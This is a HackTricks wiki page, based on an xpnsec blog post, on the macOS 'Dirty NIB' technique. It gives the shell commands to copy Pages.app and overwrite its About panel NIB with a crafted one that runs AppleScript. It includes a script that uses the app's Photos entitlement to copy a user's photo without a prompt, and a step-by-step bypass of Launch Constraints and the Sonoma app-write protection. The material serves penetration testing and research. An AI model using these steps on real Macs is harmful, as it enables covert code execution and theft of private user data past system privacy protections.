# macOS Dirty NIB

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**This technique was taken from the post** [**https://blog.xpnsec.com/dirtynib/**](https://blog.xpnsec.com/dirtynib/)

## Basic Information

NIB files are used in Apple's development ecosystem to **define user interface (UI) elements** and their interactions within an application. Created with the Interface Builder tool, they contain **serialized objects** like windows, buttons, and text fields, which are loaded at runtime to present the designed UI. Although still in use, Apple has transitioned towards recommending Storyboards for a more visual representation of an application's UI flow.

{% hint style="danger" %}
Moreover, **NIB files** can also be used to **run arbitrary commands** and if NIB file is modified in an App, **Gatekeeper will still allow to execute the app**, so they can be used to r**un arbitrary commands inside applications**.
{% endhint %}

## Dirty NIB Injection <a href="#dirtynib" id="dirtynib"></a>

First we need to create a new NIB file, we’ll use XCode for the bulk of the construction. We start by adding an Object to the interface and set the class to NSAppleScript:

<figure><img src="../../../.gitbook/assets/image (681).png" alt="" width="380"><figcaption></figcaption></figure>

For the object we need to set the initial `source` property, which we can do using User Defined Runtime Attributes:

<figure><img src="../../../.gitbook/assets/image (682).png" alt="" width="563"><figcaption></figcaption></figure>

This sets up our code execution gadget, which is just going to **run AppleScript on request**. To actually trigger the execution of the AppleScript, we’ll just add in a button for now (you can of course get creative with this ;). The button will bind to the `Apple Script` object we just created, and will **invoke the `executeAndReturnError:` selector**:

<figure><img src="../../../.gitbook/assets/image (683).png" alt="" width="563"><figcaption></figcaption></figure>

For testing we’ll just use the Apple Script of:

```bash
set theDialogText to "PWND"
display dialog theDialogText
```

And if we run this in XCode debugger and hit the button:

<figure><img src="../../../.gitbook/assets/image (684).png" alt="" width="563"><figcaption></figcaption></figure>

With our ability to execute arbitrary AppleScript code from a NIB, we next need a target. Let’s choose Pages for our initial demo, which is of course an Apple application and certainly shouldn’t be modifiable by us.

We’ll first take a copy of the application into `/tmp/`:

```bash
cp -a -X /Applications/Pages.app /tmp/
```

Then we’ll launch the application to avoid any Gatekeeper issues and allow things to be cached:

```bash
open -W -g -j /Applications/Pages.app
```

After launching (and killing) the app the first time, we’ll need to overwrite an existing NIB file with our DirtyNIB file. For demo purposes, we’re just going to overwrite the About Panel NIB so we can control the execution:

```bash
cp /tmp/Dirty.nib /tmp/Pages.app/Contents/Resources/Base.lproj/TMAAboutPanel.nib
```

Once we’ve overwritten the nib, we can trigger execution by selecting the `About` menu item:\


<figure><img src="../../../.gitbook/assets/image (685).png" alt="" width="563"><figcaption></figcaption></figure>

If we look at Pages a bit closer, we see that it has a private entitlement to allow access to a users Photos:

<figure><img src="../../../.gitbook/assets/image (686).png" alt="" width="479"><figcaption></figcaption></figure>

So we can put our POC to the test by **modifying our AppleScript to steal photos** from the user without prompting:

{% code overflow="wrap" %}
```applescript
use framework "Cocoa"
use framework "Foundation"

set grabbed to current application's NSData's dataWithContentsOfFile:"/Users/xpn/Pictures/Photos Library.photoslibrary/originals/6/68CD9A98-E591-4D39-B038-E1B3F982C902.gif"

grabbed's writeToFile:"/Users/xpn/Library/Containers/com.apple.iWork.Pages/Data/wtf.gif" atomically:1
```
{% endcode %}

{% hint style="danger" %}
[**Malicious .xib file that executes arbitrary code example.**](https://gist.github.com/xpn/16bfbe5a3f64fedfcc1822d0562636b4)
{% endhint %}

## Launch Constraints

They basically **prevent executing applications outside of their expected locations**, so if you copy an application protected by Launch Constrains to `/tmp` you won't be able to execute it.\
[**Find more information in this post**](../macos-security-protections/#launch-constraints)**.**

However, parsing the file **`/System/Volumes/Preboot/*/boot/*/usr/standalone/firmware/FUD/StaticTrustCache.img4`** you can still find **applications that aren't protected by Launch Constrains** so can could still **inject** **NIB** files in arbitrary locations into **those** (check the previous link to learn how to find these apps).

## Extra Protections

From macOS Somona, there are some protections **preventing to write inside Apps**. However, it's still possible to bypass this protection if, before running your copy of the binary, you change the name of the Contents folder:

1. Take a copy of `CarPlay Simulator.app` to `/tmp/`
2. Rename `/tmp/Carplay Simulator.app/Contents` to `/tmp/CarPlay Simulator.app/NotCon`
3. Launch the binary `/tmp/CarPlay Simulator.app/NotCon/MacOS/CarPlay Simulator` to cache within Gatekeeper
4. Overwrite `NotCon/Resources/Base.lproj/MainMenu.nib` with our `Dirty.nib` file
5. Rename to `/tmp/CarPlay Simulator.app/Contents`
6. Launch `CarPlay Simulator.app` again

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
